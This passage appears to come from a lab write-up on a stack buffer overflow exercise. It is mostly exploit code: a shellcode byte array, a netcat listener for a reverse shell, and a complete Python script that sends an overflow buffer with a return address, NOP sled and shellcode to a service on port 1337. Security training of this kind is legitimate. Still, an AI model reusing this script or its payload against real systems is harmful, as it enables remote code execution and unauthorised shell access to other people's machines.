"\xb1\x67\x13\x79\xf8\x7f\x70\x44\xb2\xf4\x42\x32\x45\xdc\x9a"
"\xbb\xea\x21\x13\x4e\xf2\x66\x94\xb1\x81\x9e\xe6\x4c\x92\x65"
"\x94\x8a\x17\x7d\x3e\x58\x8f\x59\xbe\x8d\x56\x2a\xcc\x7a\x1c"
"\x74\xd1\x7d\xf1\x0f\xed\xf6\xf4\xdf\x67\x4c\xd3\xfb\x2c\x16"
"\x7a\x5a\x89\xf9\x83\xbc\x72\xa5\x21\xb7\x9f\xb2\x5b\x9a\xf7"
"\x77\x56\x24\x08\x10\xe1\x57\x3a\xbf\x59\xff\x76\x48\x44\xf8"
"\x79\x63\x30\x96\x87\x8c\x41\xbf\x43\xd8\x11\xd7\x62\x61\xfa"
"\x27\x8a\xb4\xad\x77\x24\x67\x0e\x27\x84\xd7\xe6\x2d\x0b\x07"
"\x16\x4e\xc1\x20\xbd\xb5\x82\x44\x49\x81\x59\x31\x4f\xe9\x4c"
"\x9d\xc6\x0f\x04\x0d\x8f\x98\xb1\xb4\x8a\x52\x23\x38\x01\x1f"
"\x63\xb2\xa6\xe0\x2a\x33\xc2\xf2\xdb\xb3\x99\xa8\x4a\xcb\x37"
"\xc4\x11\x5e\xdc\x14\x5f\x43\x4b\x43\x08\xb5\x82\x01\xa4\xec"
"\x3c\x37\x35\x68\x06\xf3\xe2\x49\x89\xfa\x67\xf5\xad\xec\xb1"
"\xf6\xe9\x58\x6e\xa1\xa7\x36\xc8\x1b\x06\xe0\x82\xf0\xc0\x64"
"\x52\x3b\xd3\xf2\x5b\x16\xa5\x1a\xed\xcf\xf0\x25\xc2\x87\xf4"
"\x5e\x3e\x38\xfa\xb5\xfa\x58\x19\x1f\xf7\xf0\x84\xca\xba\x9c"
"\x36\x21\xf8\x98\xb4\xc3\x81\x5e\xa4\xa6\x84\x1b\x62\x5b\xf5"
"\x34\x07\x5b\xaa\x35\x02")
postfix = ""
  
buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
```

### Prepend NOPs

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (`\x90`) bytes:

```python
padding = "\x90" * 16
```

### Exploit

We prepare our reverse shell :
```bash
nc -lnvp 4444
```

  
And we restart the Immunity Debugger before launching the exploit.
We will get a reverse shell.

Here is the complete exploit script :

```python
import socket

ip = "10.10.227.28"
port = 1337

prefix = "OVERFLOW8 "
offset = 1786
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xba\x5e\xf1\x50\x3f\xdb\xd5\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x53\x0e\x03\x0d\xff\xb2\xca\x4d\x17\xb0"
"\x35\xad\xe8\xd5\xbc\x48\xd9\xd5\xdb\x19\x4a\xe6\xa8\x4f\x67"
"\x8d\xfd\x7b\xfc\xe3\x29\x8c\xb5\x4e\x0c\xa3\x46\xe2\x6c\xa2"
"\xc4\xf9\xa0\x04\xf4\x31\xb5\x45\x31\x2f\x34\x17\xea\x3b\xeb"
"\x87\x9f\x76\x30\x2c\xd3\x97\x30\xd1\xa4\x96\x11\x44\xbe\xc0"
"\xb1\x67\x13\x79\xf8\x7f\x70\x44\xb2\xf4\x42\x32\x45\xdc\x9a"
"\xbb\xea\x21\x13\x4e\xf2\x66\x94\xb1\x81\x9e\xe6\x4c\x92\x65"
"\x94\x8a\x17\x7d\x3e\x58\x8f\x59\xbe\x8d\x56\x2a\xcc\x7a\x1c"
"\x74\xd1\x7d\xf1\x0f\xed\xf6\xf4\xdf\x67\x4c\xd3\xfb\x2c\x16"
"\x7a\x5a\x89\xf9\x83\xbc\x72\xa5\x21\xb7\x9f\xb2\x5b\x9a\xf7"
"\x77\x56\x24\x08\x10\xe1\x57\x3a\xbf\x59\xff\x76\x48\x44\xf8"
"\x79\x63\x30\x96\x87\x8c\x41\xbf\x43\xd8\x11\xd7\x62\x61\xfa"
"\x27\x8a\xb4\xad\x77\x24\x67\x0e\x27\x84\xd7\xe6\x2d\x0b\x07"
"\x16\x4e\xc1\x20\xbd\xb5\x82\x44\x49\x81\x59\x31\x4f\xe9\x4c"
"\x9d\xc6\x0f\x04\x0d\x8f\x98\xb1\xb4\x8a\x52\x23\x38\x01\x1f"
"\x63\xb2\xa6\xe0\x2a\x33\xc2\xf2\xdb\xb3\x99\xa8\x4a\xcb\x37"
"\xc4\x11\x5e\xdc\x14\x5f\x43\x4b\x43\x08\xb5\x82\x01\xa4\xec"
"\x3c\x37\x35\x68\x06\xf3\xe2\x49\x89\xfa\x67\xf5\xad\xec\xb1"
"\xf6\xe9\x58\x6e\xa1\xa7\x36\xc8\x1b\x06\xe0\x82\xf0\xc0\x64"
"\x52\x3b\xd3\xf2\x5b\x16\xa5\x1a\xed\xcf\xf0\x25\xc2\x87\xf4"
"\x5e\x3e\x38\xfa\xb5\xfa\x58\x19\x1f\xf7\xf0\x84\xca\xba\x9c"
"\x36\x21\xf8\x98\xb4\xc3\x81\x5e\xa4\xa6\x84\x1b\x62\x5b\xf5"
"\x34\x07\x5b\xaa\x35\x02")
postfix = ""
  
buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
```